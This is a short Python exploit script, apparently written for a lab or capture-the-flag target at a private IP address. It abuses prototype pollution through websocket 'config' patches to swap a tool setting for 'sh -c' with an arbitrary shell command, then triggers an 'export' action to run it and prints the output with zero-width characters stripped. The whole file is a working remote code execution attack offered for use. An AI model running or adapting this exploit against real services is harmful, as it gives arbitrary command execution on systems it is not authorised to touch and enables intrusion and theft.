#!/usr/bin/env python3
# rce.py  —  python3 rce.py '<shell command>'
import sys, json, websocket
ZW = "​‌‍"
ws = websocket.create_connection("ws://10.0.216.147:8765", timeout=20)
ws.settimeout(6); ws.recv()
for patch in ({"__proto__": {"tool": "sh"}},
              {"__proto__": {"args": ["-c", sys.argv[1] + " 2>&1"]}}):
    ws.send(json.dumps({"type": "config", "patch": patch})); ws.recv()
ws.send(json.dumps({"type": "export"}))
out = ws.recv()
print("".join(c for c in out if c not in ZW)
      .replace("RUNNING SIMULATION... SIMULATION COMPLETE.\n", "", 1))
